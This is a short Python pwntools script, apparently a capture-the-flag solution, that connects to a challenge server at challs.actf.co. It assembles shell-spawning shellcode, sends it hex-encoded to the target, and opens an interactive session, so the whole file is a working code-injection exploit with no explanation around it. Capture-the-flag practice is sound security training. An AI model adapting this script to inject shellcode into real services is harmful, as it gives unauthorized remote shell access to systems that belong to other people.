from pwn import *

r = remote("challs.actf.co", 31200)
exe = ELF("./chall")

context.binary = exe

shellcode = asm(shellcraft.sh())

r.sendline(shellcode.hex())

r.interactive()